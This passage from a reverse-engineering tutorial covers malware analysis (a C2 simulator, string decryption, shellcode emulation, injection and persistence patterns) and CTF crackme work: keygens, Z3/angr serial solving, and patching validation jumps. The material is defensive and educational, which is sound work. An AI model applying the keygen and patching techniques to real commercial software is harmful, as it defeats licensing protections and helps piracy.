after = get_files('/tmp')

# Compare
new_files = set(after.keys()) - set(before.keys())
modified = {f for f in after if f in before and after[f] != before[f]}
deleted = set(before.keys()) - set(after.keys())

print(f"New files: {new_files}") print(f"Modified: {modified}") print(f"Deleted: {deleted}")
````

### Network Communication Analysis

**Extracting Network IOCs:**
```bash
# Find IP addresses in binary
strings malware.bin | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"

# Find domains
strings malware.bin | grep -E "[a-zA-Z0-9-]+\.(com|net|org|io|xyz)"

# Find URLs
strings malware.bin | grep -E "https?://"

# Check for Base64 encoded URLs
strings malware.bin | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | while read line; do
    decoded=$(echo "$line" | base64 -d 2>/dev/null)
    if [[ "$decoded" =~ http ]]; then
        echo "Found: $decoded"
    fi
done
````

**Simulating C2 Server:**

```python
#!/usr/bin/env python3
# Simple C2 server simulator for analysis
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[GET] {self.path}")
        print(f"[Headers] {self.headers}")
        
        # Respond with fake data
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"OK")
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        print(f"[POST] {self.path}")
        print(f"[Headers] {self.headers}")
        print(f"[Body] {post_data}")
        
        # Try to decode
        try:
            print(f"[Decoded] {post_data.decode()}")
        except:
            print(f"[Hex] {post_data.hex()}")
        
        # Respond
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        response = json.dumps({"status": "ok", "command": "none"})
        self.wfile.write(response.encode())

# Run server
server = HTTPServer(('0.0.0.0', 8080), C2Handler)
print("[*] C2 Server listening on port 8080")
server.serve_forever()
```

**DNS Monitoring:**

```bash
# Capture DNS queries
sudo tcpdump -i any -n port 53 -w dns.pcap

# Parse DNS queries
tshark -r dns.pcap -T fields -e dns.qry.name | sort -u

# Fake DNS server
sudo dnschef --fakeip 127.0.0.1 --interface 0.0.0.0 --port 53
```

### Decrypting Encrypted Strings

**Identifying String Decryption Routines:**

```bash
# Look for patterns:
# 1. Loop over byte array
# 2. XOR/ADD/SUB operations
# 3. Result written to buffer

# In Ghidra, find functions that:
# - Take pointer and length parameters
# - Return pointer to new buffer
# - Contain loops with byte operations

# Example disassembly pattern:
# mov al, [rsi + rcx]    ; Load encrypted byte
# xor al, 0x42           ; XOR with key
# mov [rdi + rcx], al    ; Store decrypted byte
# inc rcx                ; Next byte
# cmp rcx, rdx           ; Check length
# jl loop                ; Continue
```

**Extracting Encrypted Strings:**

```python
# Find encrypted string buffers in binary
import pefile
import re

pe = pefile.PE('malware.exe')

# Find .data or .rdata section
for section in pe.sections:
    if section.Name.startswith(b'.data') or section.Name.startswith(b'.rdata'):
        data = section.get_data()
        
        # Look for high-entropy byte sequences
        # These might be encrypted strings
        for i in range(0, len(data) - 20, 4):
            chunk = data[i:i+20]
            # Check if not all nulls and has variety
            if chunk.count(0) < 15 and len(set(chunk)) > 5:
                print(f"Potential encrypted string at offset {section.PointerToRawData + i:#x}")
                print(f"  Data: {chunk.hex()}")
```

**Dynamic String Extraction:**

```python
# Frida script to hook string decryption
import frida
import sys

script_code = """
// Hook common string decryption function
// Adjust address based on analysis
var decrypt_addr = ptr("0x401234");

Interceptor.attach(decrypt_addr, {
    onEnter: function(args) {
        this.encrypted = args[0];
        this.length = args[1].toInt32();
        console.log("[*] Decrypt called");
        console.log("    Encrypted: " + hexdump(this.encrypted, {length: this.length}));
    },
    onLeave: function(retval) {
        console.log("    Decrypted: " + Memory.readCString(retval));
        console.log("");
    }
});
"""

# For ELF binaries
def on_message(message, data):
    print(f"[Frida] {message}")

process = frida.spawn(["./malware"])
session = frida.attach(process)
script = session.create_script(script_code)
script.on('message', on_message)
script.load()
frida.resume(process)
sys.stdin.read()
```

**Manual Decryption:**

```python
# Once algorithm is identified from disassembly
# Example: Simple XOR with key

def decrypt_string(encrypted, key):
    """Single-byte XOR decryption"""
    return bytes([b ^ key for b in encrypted])

# Extract encrypted data from binary
with open('malware.bin', 'rb') as f:
    f.seek(0x2000)  # Offset from analysis
    encrypted = f.read(50)

# Try decryption with identified key
key = 0x42
decrypted = decrypt_string(encrypted, key)
print(f"Decrypted: {decrypted.decode('utf-8', errors='ignore')}")

# Multi-byte XOR
def decrypt_multibyte(encrypted, key):
    """Multi-byte repeating XOR"""
    return bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])

key = b"secret"
decrypted = decrypt_multibyte(encrypted, key)
print(f"Decrypted: {decrypted}")

# RC4 decryption (common in malware)
from Crypto.Cipher import ARC4

key = b"rc4_key"
cipher = ARC4.new(key)
decrypted = cipher.decrypt(encrypted)
print(f"Decrypted: {decrypted}")
```

### Code Injection Detection

**Recognizing Injection Patterns:**

**Process Hollowing (Windows):**

```c
// Typical API sequence:
CreateProcess(suspended)
NtUnmapViewOfSection  // Hollow out target
VirtualAllocEx        // Allocate memory
WriteProcessMemory    // Write malicious code
SetThreadContext      // Point to new code
ResumeThread          // Execute
```

**DLL Injection:**

```c
// Classic DLL injection:
OpenProcess
VirtualAllocEx
WriteProcessMemory    // Write DLL path
CreateRemoteThread(LoadLibrary)

// Reflective DLL injection:
VirtualAllocEx
WriteProcessMemory    // Write entire DLL
CreateRemoteThread    // Execute reflective loader
```

**Detecting in Disassembly:**

```bash
# Search for API call sequences
objdump -d malware.exe | grep -A10 "CreateProcess"

# In IDA/Ghidra, look for:
# 1. Calls to process creation APIs
# 2. Memory allocation in other processes
# 3. Writing to remote process memory
# 4. Thread creation in remote process
```

**Extracting Injected Payload:**

```python
# If payload is embedded in binary
# Find the WriteProcessMemory call
# Trace back to find source buffer

# GDB approach:
# break WriteProcessMemory
# x/100x $rsi  # Second argument (source buffer)

# Extract payload from binary
import pefile

pe = pefile.PE('malware.exe')

# Find .data section or resource
for section in pe.sections:
    if section.Name.startswith(b'.data'):
        data = section.get_data()
        
        # Look for PE header (MZ)
        offset = data.find(b'MZ')
        if offset != -1:
            print(f"Found embedded PE at offset {offset:#x}")
            # Extract embedded PE
            embedded_pe = data[offset:offset+100000]  # Adjust size
            
            with open('injected_payload.exe', 'wb') as f:
                f.write(embedded_pe)
```

### Shellcode Analysis

**Identifying Shellcode:**

```bash
# Characteristics:
# - Position-independent code
# - No standard function prologue
# - Unusual instruction patterns
# - Inline system calls

# Look for GetPC (Get Program Counter) patterns:
# call $+5          ; Push return address
# pop eax           ; EAX = current position

# Or FSTENV trick:
# fnstenv [esp-12]
# pop eax           ; EAX = instruction pointer
```

**Extracting Shellcode:**

```python
# Find shellcode in binary/network capture
import re

# Common shellcode patterns (x86)
patterns = [
    rb'\xeb.[\x5e\x59]',  # jmp/call/pop pattern
    rb'\x31[\xc0\xc9\xdb]',  # xor reg, reg (zero register)
    rb'\x50\x68.....\x68',   # push immediate values
]

with open('malware.bin', 'rb') as f:
    data = f.read()
    
for pattern in patterns:
    matches = re.finditer(pattern, data)
    for match in matches:
        offset = match.start()
        print(f"Possible shellcode at offset {offset:#x}")
        
        # Extract 200 bytes
        shellcode = data[offset:offset+200]
        with open(f'shellcode_{offset:x}.bin', 'wb') as f:
            f.write(shellcode)
```

**Analyzing Shellcode:**

```bash
# Disassemble shellcode
# x86
ndisasm -b32 shellcode.bin

# x64
ndisasm -b64 shellcode.bin

# With objdump
objdump -D -Mintel,x86-64 -b binary -m i386 shellcode.bin

# In Ghidra:
# File → Import File
# Format: Raw Binary
# Language: x86:LE:32:default (or x64)
# Click on Options
# Set base address (e.g., 0x0)
```

**Emulating Shellcode:**

```python
# Unicorn engine for shellcode emulation
from unicorn import *
from unicorn.x86_const import *

# Read shellcode
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# Initialize emulator (x86-32 mode)
mu = Uc(UC_ARCH_X86, UC_MODE_32)

# Map memory
ADDRESS = 0x1000000
mu.mem_map(ADDRESS, 2 * 1024 * 1024)

# Write shellcode
mu.mem_write(ADDRESS, shellcode)

# Set up stack
mu.reg_write(UC_X86_REG_ESP, ADDRESS + 0x200000)

# Hook instructions
def hook_code(uc, address, size, user_data):
    code = uc.mem_read(address, size)
    print(f"0x{address:x}: {code.hex()}")

mu.hook_add(UC_HOOK_CODE, hook_code)

# Hook syscalls/interrupts
def hook_intr(uc, intno, user_data):
    if intno == 0x80:  # Linux syscall
        eax = uc.reg_read(UC_X86_REG_EAX)
        print(f"Syscall: {eax}")
        
        if eax == 11:  # execve
            ebx = uc.reg_read(UC_X86_REG_EBX)
            filename = read_string(uc, ebx)
            print(f"  execve({filename})")

mu.hook_add(UC_HOOK_INTR, hook_intr)

def read_string(uc, addr):
    result = b""
    while True:
        byte = uc.mem_read(addr, 1)
        if byte == b'\x00':
            break
        result += byte
        addr += 1
    return result.decode('utf-8', errors='ignore')

# Emulate
try:
    mu.emu_start(ADDRESS, ADDRESS + len(shellcode))
except UcError as e:
    print(f"Error: {e}")
```

**Shellcode Decoder Detection:**

```python
# Many shellcodes use decoders (XOR, ADD, etc.)
# Pattern: Small loop that modifies following bytes

# Look for:
# 1. Loop counter initialization
# 2. Memory read
# 3. Arithmetic operation (XOR, SUB, ADD)
# 4. Memory write
# 5. Loop back

# Example encoded shellcode pattern:
# Decoder stub (10-30 bytes) + Encoded payload

def find_decoder_stub(data):
    """Find potential shellcode decoder stubs"""
    # Look for loop patterns
    # EB XX     - JMP short
    # 5E        - POP ESI (common in GetPC)
    # 31 C9     - XOR ECX, ECX (zero counter)
    # B1 XX     - MOV CL, immediate (set counter)
    
    decoder_patterns = [
        rb'\xeb.[\x5e\x59].\x31\xc9',  # jmp/call/pop + xor ecx,ecx
        rb'\x31\xc9\xb1',               # xor ecx,ecx + mov cl,imm
    ]
    
    matches = []
    for pattern in decoder_patterns:
        for match in re.finditer(pattern, data):
            matches.append(match.start())
    
    return matches

# Automated decoder extraction
with open('shellcode.bin', 'rb') as f:
    data = f.read()

stubs = find_decoder_stub(data)
for offset in stubs:
    print(f"Potential decoder at offset {offset:#x}")
```

### Persistence Mechanism Analysis

**Common Persistence Locations:**

**Windows:**

```bash
# Registry Run keys
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Services
HKLM\SYSTEM\CurrentControlSet\Services\

# Scheduled Tasks
C:\Windows\System32\Tasks\

# Startup Folder
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\

# DLL hijacking locations
# Check for DLLs in application directory
# Common targets: version.dll, dwmapi.dll, etc.
```

**Linux:**

```bash
# Cron jobs
/etc/crontab
/etc/cron.d/*
/var/spool/cron/crontabs/*

# Systemd services
/etc/systemd/system/
/lib/systemd/system/

# Init scripts
/etc/init.d/

# Profile scripts
~/.bashrc
~/.profile
/etc/profile

# LD_PRELOAD
/etc/ld.so.preload

# PAM modules
/etc/pam.d/
/lib/security/
```

**Detection in Malware:**

```bash
# Search for persistence-related strings
strings malware.bin | grep -i -E "(Run|Service|cron|systemd|startup)"

# Windows API calls
# CreateService, RegSetValueEx, WinExec

# Check imports
python3 << EOF
import pefile
pe = pefile.PE('malware.exe')
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    for imp in entry.imports:
        if imp.name:
            name = imp.name.decode()
            if any(x in name for x in ['Reg', 'Service', 'Task']):
                print(f"{entry.dll.decode()}: {name}")
EOF
```

**Extracting Persistence Artifacts:**

```python
# Find registry key/value being set
# Look for RegSetValueEx calls in disassembly
# Trace back to find:
# 1. Key name
# 2. Value name  
# 3. Data being written (malware path)

# GDB dynamic extraction:
# break RegSetValueEx
# p (char*)$rcx  # First arg: key handle (need to dereference)
# p (char*)$rdx  # Second arg: value name
# p (char*)$r9   # Fourth arg: data
```

### Anti-Analysis Technique Catalog

**Obfuscation Techniques:**

**1. Control Flow Flattening:**

```c
// Original:
if (condition) {
    do_something();
} else {
    do_other();
}

// Obfuscated:
switch(state) {
    case 0: state = condition ? 1 : 2; break;
    case 1: do_something(); state = 3; break;
    case 2: do_other(); state = 3; break;
    case 3: /* continue */ break;
}
```

**Recognition:**

- Large switch statement
- State variable controls flow
- Indirect jumps

**2. Opaque Predicates:**

```c
// Always true, but hard to determine statically
if ((x*x + x) % 2 == 0) {  // Always true for any integer
    real_code();
} else {
    fake_code();  // Never executed
}
```

**3. Junk Code Insertion:**

```asm
mov eax, ebx      ; Real instruction
xor edx, edx      ; Junk
push edx          ; Junk
pop edx           ; Junk
add eax, 5        ; Real instruction
```

**Detection:**

- Dead code that doesn't affect program state
- Instructions immediately undone

**4. API Obfuscation:**

```c
// Instead of direct call:
CreateFile(...)

// Obfuscated:
FARPROC func = GetProcAddress(GetModuleHandle("kernel32.dll"), decode("PerngrSvyr"));
func(...);
```

**Defeating Obfuscation:**

**Symbolic Execution with Angr:**

```python
import angr
import claripy

proj = angr.Project('obfuscated.bin', auto_load_libs=False)

# Create symbolic state
state = proj.factory.entry_state()

# Add constraints for known values
input_sym = claripy.BVS('input', 8 * 40)
state.memory.store(0x600000, input_sym)

# Explore to success state
simgr = proj.factory.simulation_manager(state)
simgr.explore(find=0x401500, avoid=0x401600)

if simgr.found:
    print(f"Found solution: {simgr.found[0].solver.eval(input_sym, cast_to=bytes)}")
```

**Simplification with Miasm:**

```python
# [Inference] - Miasm can simplify obfuscated code
from miasm.analysis.binary import Container
from miasm.analysis.machine import Machine

# Load binary
cont = Container.from_stream(open('obfuscated.bin', 'rb'))
machine = Machine(cont.arch)

# Disassemble and simplify
# Miasm can remove junk instructions and simplify expressions
```

### CTF-Specific Malware Challenges

**Ransomware Simulation:**

```python
# Typical CTF ransomware challenge:
# 1. Encrypts a file (contains flag)
# 2. Requires key to decrypt
# 3. Key is derivable from binary analysis

# Example recovery:
import os
from Crypto.Cipher import AES

# Extract key from binary (found via RE)
key = bytes.fromhex("deadbeef" * 4)  # 16 bytes

# Read encrypted file
with open('encrypted_flag.bin', 'rb') as f:
    iv = f.read(16)
    ciphertext = f.read()

# Decrypt
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)

# Remove padding
padding_len = plaintext[-1]
flag = plaintext[:-padding_len]

print(flag.decode())
```

**Keygen Challenge:**

```python
# Typical pattern:
# 1. Username input
# 2. Serial/license key input
# 3. Validation algorithm

# Reverse validation to create keygen

def generate_serial(username):
    """Generate valid serial for username"""
    # Algorithm extracted from binary
    # Example: Serial = MD5(username)[:8].upper()
    import hashlib
    hash_val = hashlib.md5(username.encode()).hexdigest()
    return hash_val[:8].upper()

username = "user123"
serial = generate_serial(username)
print(f"Username: {username}")
print(f"Serial: {serial}")
```

**VM-Protected Binary:**

```python
# Custom virtual machine protection
# Binary uses custom bytecode interpreter

# Steps:
# 1. Identify VM handler (interprets bytecode)
# 2. Extract bytecode
# 3. Reverse VM instruction set
# 4. Disassemble/decompile bytecode

# Example VM pattern recognition:
def find_vm_handler(data):
    """Find switch-based VM handler"""
    # Look for large switch/jump table
    # Followed by many basic blocks
    # Each block: VM instruction handler
    pass

# Once identified:
# 1. Map bytecode values to operations
# 2. Create disassembler
# 3. Analyze bytecode program
```

## Important Related Topics

**Advanced Symbolic Execution:** Constraint generation strategies, state merging, memory modeling, handling external libraries/syscalls in symbolic analysis

**Automatic Exploit Generation:** From crash to exploit, heap exploitation automation, ROP chain generation tools (ROPgadget, Ropper), one_gadget for libc exploitation

**Differential Analysis:** Binary diffing with BinDiff/Diaphora, patch analysis, finding security fixes, vulnerability discovery through comparison

**Firmware Emulation Frameworks:** QEMU full-system emulation for embedded devices, Firmadyne for router firmware, ARM/MIPS userland emulation, custom peripheral emulation

**Machine Learning in RE:** Function recognition, malware classification, similarity analysis with bindiff, neural network-based deobfuscation [Inference based on research directions]

**Multi-Architecture Support:** Cross-architecture calling conventions, MIPS/PowerPC/SPARC specifics, big-endian considerations, RISC-V emerging platform analysis

---

## Keygen Creation and License Validation

### Fundamentals

License validation challenges require reverse engineering authentication algorithms to either bypass checks or generate valid keys. Common in CTF crackme challenges and realistic software protection scenarios.

**Common Validation Patterns:**

```c
// Pattern 1: Simple checksum
bool validate(char *serial) {
    int sum = 0;
    for (int i = 0; serial[i]; i++) {
        sum += serial[i];
    }
    return sum == 0x1337;
}

// Pattern 2: Mathematical relationship
bool validate(char *username, char *key) {
    int hash = compute_hash(username);
    int expected = (hash * 0x5bd1e995) ^ 0xdeadbeef;
    return atoi(key) == expected;
}

// Pattern 3: Cryptographic signature
bool validate(char *serial) {
    return verify_signature(serial, public_key);
}
```

### Static Analysis Techniques

**Identifying Validation Functions:**

```bash
# Search for validation-related strings
strings binary | grep -i "invalid\|correct\|license\|serial\|key"

# Find cross-references to these strings
r2 -AA binary
[0x00400000]> aaa  # Analyze all
[0x00400000]> afl  # List functions
[0x00400000]> iz   # List strings
[0x00400000]> axt str.Invalid_serial  # Find xrefs to string

# Ghidra: Search → For Strings → "invalid" → Show References
```

**Control Flow Analysis:**

```bash
# IDA Pro / Ghidra
# 1. Locate string "Invalid" or "Correct"
# 2. Trace backwards to find comparison
# 3. Identify validation logic before comparison

# radare2
r2 -AA binary
[0x00400000]> s sym.validate_serial
[0x00400000]> pdf  # Print disassembly
[0x00400000]> VV   # Visual graph mode
[0x00400000]> agf  # ASCII graph

# Look for patterns:
# - cmp/test instructions before conditional jumps
# - jne/je after validation checks
# - call to strcmp, memcmp, or custom comparison
```

**Using Binary Ninja for Validation Logic:**

```python
# Binary Ninja Python API
import binaryninja as bn

bv = bn.open_view("./crackme")

# Find validation function
for func in bv.functions:
    if "validate" in func.name.lower() or "check" in func.name.lower():
        print(f"Found: {func.name} at {hex(func.start)}")
        
        # Analyze medium-level IL
        for block in func.medium_level_il:
            for instr in block:
                if instr.operation == bn.MediumLevelILOperation.MLIL_IF:
                    print(f"Conditional: {instr}")
```

### Dynamic Analysis and Debugging

**Tracing Validation Logic:**

```bash
# GDB with input tracing
gdb ./crackme
gef> catch syscall read
gef> commands
> x/s $rsi  # Print input buffer (x86-64)
> continue
> end
gef> run

# Set breakpoint on comparison
gef> b *0x400890  # Address of cmp instruction
gef> commands
> print $rax
> print $rdx
> if $rax == $rdx
>   echo \033[32mMatch!\033[0m\n
> else
>   echo \033[31mMismatch\033[0m\n
> end
> continue
> end
gef> run
```

**Using ltrace to Identify Library Calls:**

```bash
# Trace library function calls
ltrace -i ./crackme
# Output shows:
# strcmp("AAAA-BBBB-CCCC", "1234-5678-90AB") = -1
# strlen("AAAA-BBBB-CCCC") = 14

# Filter specific functions
ltrace -e strcmp -e strlen ./crackme

# Follow child processes
ltrace -f ./crackme
```

**Symbolic Execution with angr:**

```python
#!/usr/bin/env python3
import angr
import claripy

# Load binary
project = angr.Project('./crackme', auto_load_libs=False)

# Create symbolic input
serial_length = 16
serial = claripy.BVS('serial', serial_length * 8)  # Symbolic bitvector

# Setup initial state
state = project.factory.entry_state(
    args=['./crackme'],
    stdin=serial  # Symbolic stdin
)

# Add constraints for printable characters
for byte in serial.chop(8):
    state.solver.add(byte >= 0x20)  # Space
    state.solver.add(byte <= 0x7e)  # Tilde

# Create simulation manager
simgr = project.factory.simulation_manager(state)

# Define success/failure addresses
success_addr = 0x400a1c  # Address after "Correct!" print
failure_addr = 0x400a30  # Address after "Invalid" print

# Explore until success
simgr.explore(find=success_addr, avoid=failure_addr)

if simgr.found:
    solution_state = simgr.found[0]
    solution = solution_state.solver.eval(serial, cast_to=bytes)
    print(f"Valid serial: {solution.decode()}")
else:
    print("No solution found")
```

### Common Validation Algorithms

**CRC-Based Validation:**

```python
# Reverse engineering CRC checks
def crc32_custom(data, poly=0xEDB88320):
    """Custom CRC32 implementation often found in CTF"""
    crc = 0xFFFFFFFF
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
    return crc ^ 0xFFFFFFFF

# Generate key that produces target CRC
target_crc = 0xDEADBEEF

# Brute force approach for short keys
from itertools import product
import string

for length in range(1, 10):
    for candidate in product(string.ascii_uppercase + string.digits, repeat=length):
        key = ''.join(candidate)
        if crc32_custom(key.encode()) == target_crc:
            print(f"Found: {key}")
            break
```

**MD5/SHA Hash Validation:**

```python
#!/usr/bin/env python3
import hashlib

# Pattern: username_hash must match key_hash
def generate_key(username):
    """Generate key from username hash"""
    # Reverse engineered algorithm
    user_hash = hashlib.md5(username.encode()).hexdigest()
    
    # Apply transformation (example patterns)
    key_parts = []
    for i in range(0, len(user_hash), 8):
        chunk = user_hash[i:i+8]
        key_parts.append(str(int(chunk, 16) % 9999).zfill(4))
    
    return '-'.join(key_parts)

# Usage
username = "ctfplayer"
key = generate_key(username)
print(f"Username: {username}")
print(f"Key: {key}")
```

**XOR-Based Obfuscation:**

```python
def find_xor_key(encrypted, known_plaintext):
    """Recover XOR key from known plaintext/ciphertext pair"""
    key = bytes(e ^ p for e, p in zip(encrypted, known_plaintext))
    return key

# Example: serial validation uses XOR
encrypted_flag = bytes.fromhex("3c1f7d28394b6e2a1f")
known_start = b"CTF{"  # Known flag format

xor_key = find_xor_key(encrypted_flag[:4], known_start)
print(f"XOR Key: {xor_key.hex()}")

# Decrypt entire flag
def xor_decrypt(data, key):
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

flag = xor_decrypt(encrypted_flag, xor_key)
print(f"Flag: {flag.decode()}")
```

**Base64 and Encoding Chains:**

```python
import base64
import codecs

def decode_chain(encoded):
    """Common encoding chain decoder"""
    # Try common chains
    decoders = [
        lambda x: base64.b64decode(x),
        lambda x: bytes.fromhex(x.decode()),
        lambda x: codecs.decode(x, 'rot13').encode(),
        lambda x: x[::-1]  # Reverse
    ]
    
    current = encoded
    for decoder in decoders:
        try:
            current = decoder(current)
            print(f"After {decoder.__name__}: {current}")
        except:
            pass
    
    return current

# Usage
encoded_serial = b"VEVTVF9GTEFHe2RlY29kZWR9"
decode_chain(encoded_serial)
```

### Keygen Development

**Template Keygen Script:**

```python
#!/usr/bin/env python3
"""
Keygen for CrackMe Challenge
Reverse engineered validation algorithm
"""
import sys
import struct

def compute_checksum(username):
    """Reverse engineered checksum algorithm"""
    checksum = 0x5A5A5A5A
    
    for i, char in enumerate(username):
        checksum ^= ord(char) << (i % 24)
        checksum = ((checksum << 3) | (checksum >> 29)) & 0xFFFFFFFF
        checksum += 0x12345678
        checksum &= 0xFFFFFFFF
    
    return checksum

def generate_serial(username):
    """Generate valid serial for given username"""
    checksum = compute_checksum(username)
    
    # Format: XXXX-YYYY-ZZZZ-WWWW
    part1 = (checksum >> 24) & 0xFFFF
    part2 = (checksum >> 16) & 0xFFFF
    part3 = (checksum >> 8) & 0xFFFF
    part4 = checksum & 0xFFFF
    
    serial = f"{part1:04X}-{part2:04X}-{part3:04X}-{part4:04X}"
    return serial

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <username>")
        sys.exit(1)
    
    username = sys.argv[1]
    serial = generate_serial(username)
    
    print(f"Username: {username}")
    print(f"Serial:   {serial}")

if __name__ == "__main__":
    main()
```

**Advanced Keygen with Multiple Algorithms:**

```python
#!/usr/bin/env python3
import hashlib
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class KeygenMulti:
    """Multi-algorithm keygen for complex validation"""
    
    def __init__(self, username):
        self.username = username
        self.algorithms = {
            'simple': self.algo_simple,
            'hash': self.algo_hash,
            'crypto': self.algo_crypto,
        }
    
    def algo_simple(self):
        """Simple mathematical transformation"""
        value = sum(ord(c) * (i + 1) for i, c in enumerate(self.username))
        return f"{value:08X}"
    
    def algo_hash(self):
        """Hash-based generation"""
        h = hashlib.sha256(self.username.encode()).digest()
        key_bytes = struct.unpack('<4I', h[:16])
        return '-'.join(f"{x:08X}" for x in key_bytes)
    
    def algo_crypto(self):
        """Cryptographic transformation"""
        # Derive key from username
        key = hashlib.md5(self.username.encode()).digest()
        
        # Encrypt known plaintext
        plaintext = b"VALID_LICENSE_KEY"
        cipher = AES.new(key, AES.MODE_ECB)
        ciphertext = cipher.encrypt(pad(plaintext, 16))
        
        return ciphertext.hex().upper()
    
    def generate(self, algorithm='simple'):
        """Generate key using specified algorithm"""
        if algorithm not in self.algorithms:
            raise ValueError(f"Unknown algorithm: {algorithm}")
        
        return self.algorithms[algorithm]()
    
    def generate_all(self):
        """Generate keys using all algorithms"""
        return {algo: func() for algo, func in self.algorithms.items()}

# Usage
if __name__ == "__main__":
    keygen = KeygenMulti("ctfplayer")
    
    print("Generated keys:")
    for algo, key in keygen.generate_all().items():
        print(f"{algo:10s}: {key}")
```

### Patching Validation Checks

**NOP-ing Validation:**

```bash
# Using radare2
r2 -w binary  # Write mode
[0x00400000]> aaa
[0x00400000]> s sym.validate_license
[0x00400000]> pdf

# Find conditional jump after validation
# Example: jne 0x400890 (jump if not equal - validation failed)

[0x00400000]> s 0x400885  # Address of jne
[0x00400000]> wx 9090     # Write NOPs (0x90 0x90)
# or
[0x00400000]> wx eb05     # Write jmp (unconditional) with offset

[0x00400000]> q  # Quit and save
```

**Inverting Conditional Jumps:**

```python
#!/usr/bin/env python3
"""Patch binary to invert validation check"""

def patch_validation(binary_path, offset, original, patched):
    """
    Patch validation jump
    offset: Location of conditional jump
    original: Original bytes (e.g., b'\x75\x10' for jne)
    patched: Patched bytes (e.g., b'\x74\x10' for je)
    """
    with open(binary_path, 'r+b') as f:
        f.seek(offset)
        current = f.read(len(original))
        
        if current != original:
            print(f"Warning: Expected {original.hex()}, found {current.hex()}")
            return False
        
        f.seek(offset)
        f.write(patched)
        print(f"Patched {offset:#x}: {original.hex()} -> {patched.hex()}")
        return True

# Usage
patch_validation(
    'crackme',
    0x885,  # Offset from analysis
    b'\x75\x10',  # jne (75) - jump if validation fails
    b'\x74\x10'   # je (74) - jump if validation succeeds (inverted)
)
```

**Using pwntools for Binary Patching:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
elf = ELF('./crackme')

# Patch specific address
elf.write(0x400890, asm('nop; nop'))  # NOP out validation

# Or patch multiple locations
patches = {
    0x400890: asm('xor eax, eax; ret'),  # Force return 0 (success)
    0x4008a0: b'\xeb\x10',                # Unconditional jump
}

for addr, patch in patches.items():
    elf.write(addr, patch)

# Save patched binary
elf.save('./crackme_patched')
print("Patched binary saved")
```

### Constraint Solving for License Generation

**Z3 Solver for Complex Constraints:**

```python
#!/usr/bin/env python3
from z3 import *

def solve_license_constraint():
    """
    Solve complex validation constraint using Z3
    Example: find serial where multiple conditions must be satisfied
    """
    
    # Define serial as array of bytes
    serial = [BitVec(f'serial_{i}', 8) for i in range(16)]
    
    solver = Solver()
    
    # Constraint 1: Printable ASCII
    for byte in serial:
        solver.add(And(byte >= 0x20, byte <= 0x7e))
    
    # Constraint 2: Specific format (e.g., XXXX-YYYY-ZZZZ)
    solver.add(serial[4] == ord('-'))
    solver.add(serial[9] == ord('-'))
    solver.add(serial[14] == ord('-'))
    
    # Constraint 3: Mathematical relationship
    # Example: sum of first 4 chars must equal 0x190
    sum_first = Sum([ZeroExt(24, serial[i]) for i in range(4)])
    solver.add(sum_first == 0x190)
    
    # Constraint 4: XOR relationship
    # serial[5] ^ serial[6] ^ serial[7] ^ serial[8] == 0x42
    solver.add(serial[5] ^ serial[6] ^ serial[7] ^ serial[8] == 0x42)
    
    # Constraint 5: Product constraint
    # serial[0] * serial[1] == 0x1234
    solver.add(ZeroExt(8, serial[0]) * ZeroExt(8, serial[1]) == 0x1234)
    
    # Solve
    if solver.check() == sat:
        model = solver.model()
        solution = ''.join(chr(model[byte].as_long()) for byte in serial)
        return solution
    else:
        return None

# Usage
solution = solve_license_constraint()
if solution:
    print(f"Valid serial: {solution}")
else:
    print("No solution found")
```

**angr for Path Exploration:**

```python
#!/usr/bin/env python3
import angr
import claripy

def find_valid_license(binary_path):
    """Use angr to explore paths and find valid license"""
    
    project = angr.Project(binary_path, auto_load_libs=False)
    
    # Create symbolic license input
    license_sym = claripy.BVS('license', 20 * 8)  # 20 bytes
    
    # Initial state
    state = project.factory.entry_state(
        args=[binary_path],
        stdin=license_sym
    )
    
    # Constrain to printable ASCII
    for byte in license_sym.chop(8):
        state.solver.add(And(byte >= 0x20, byte <= 0x7e))
    
    # Find success message address
    success_str = b"Access Granted"
    success_addr = None
    
    # Locate string in binary
    for addr, string in project.loader.main_object.strings:
        if success_str in string:
            # Find xref to this string
            cfg = project.analyses.CFGFast()
            # [Inference] Finding exact success address requires CFG analysis
            print(f"Found success string at {hex(addr)}")
    
    # Explore
    simgr = project.factory.simulation_manager(state)
    simgr.explore(find=lambda s: success_str in s.posix.dumps(1))
    
    if simgr.found:
        found_state = simgr.found[0]
        valid_license = found_state.solver.eval(license_sym, cast_to=bytes)
        return valid_license.decode(errors='ignore')
    
    return None

# Usage
license_key = find_valid_license('./crackme')
if license_key:
    print(f"Valid license: {license_key}")
```

### Hardware-Based License Validation

**HWID-Based Validation:**

```python
#!/usr/bin/env python3
import hashlib
import subprocess

def get_hwid():
    """Get hardware identifier (simplified)"""
    # Real implementations might use:
    # - MAC address
    # - CPU serial
    # - Disk serial
    # - Motherboard UUID
    
    try:
        # Linux example: get MAC address
        mac = subprocess.check_output("cat /sys/class/net/eth0/address", shell=True)
        return mac.strip().decode()
    except:
        return "00:00:00:00:00:00"

def generate_hwid_license(username, hwid):
    """Generate license bound to hardware"""
    # Combine username and HWID
    combined = f"{username}:{hwid}".encode()
    
    # Generate hash
    license_hash = hashlib.sha256(combined).hexdigest()
    
    # Format as license key
    formatted = '-'.join([
        license_hash[i:i+4].upper() 
        for i in range(0, 16, 4)
    ])
    
    return formatted

# Usage
username = "ctfplayer"
